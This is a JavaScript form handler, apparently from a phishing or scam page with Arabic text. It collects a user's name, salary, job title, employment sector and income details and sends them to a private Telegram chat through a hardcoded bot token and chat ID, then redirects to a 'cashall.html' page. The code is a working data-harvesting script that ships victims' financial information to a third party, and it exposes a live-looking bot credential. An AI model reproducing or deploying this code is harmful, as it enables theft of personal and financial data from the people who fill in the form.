<script>
  const botToken = '8393679169:AAFqq4LyZk6NU49HZsPf7VJRkNMUKNMqXtk'; 
const chatId = '8201670834';         

  document.getElementById('incomeForm').addEventListener('submit', function(e) {
    e.preventDefault();

    // استرجاع الاسم المخزن
    const storedName = localStorage.getItem('userName') || 'غير معروف';

    // جلب القيم من الفورم
    const salary = document.getElementById('salary').value.trim();
    const employmentType = document.getElementById('employmentType').value.trim();
    const jobTitle = document.getElementById('jobTitle').value.trim();
    const additionalIncome = document.getElementById('additionalIncome').value.trim();
    const newTotalIncome = document.getElementById('newTotalIncome').value.trim();
    const employmentSector = document.getElementById('employmentSector').value;

    // تحقق من تعبئة الحقول (اختياري لكن جيد)
    if (!salary || !employmentType || !jobTitle || !additionalIncome || !newTotalIncome || !employmentSector) {
      alert('يرجى ملء جميع الحقول');
      return;
    }

    // تركيب رسالة الإرسال
    const message = `
📩 *بيانات دخل جديدة*
- من: ${storedName}
- صافي الراتب بعد الاقتطاع: ${salary}
- المبلغ الم
لوب : ${employmentType}
- اسم الوظيفة: ${jobTitle}
- دخل إضافي: ${additionalIncome}
- الدخل الإجمالي الجديد: ${newTotalIncome}
- قطاع العمل: ${employmentSector}
    `;

    // طلب الإرسال لتليجرام
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    fetch(url, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    })
    .then(response => response.json())
    .then(data => {
      if (data.ok) {
window.location.href = 'cashall.html';
        this.reset();
      } else {
        alert('حدث خطأ أثناء الإرسال');
        console.error(data);
      }
    })
    .catch(error => {
      alert('خطأ في الاتصال بالخادم');
      console.error(error);
    });
  });
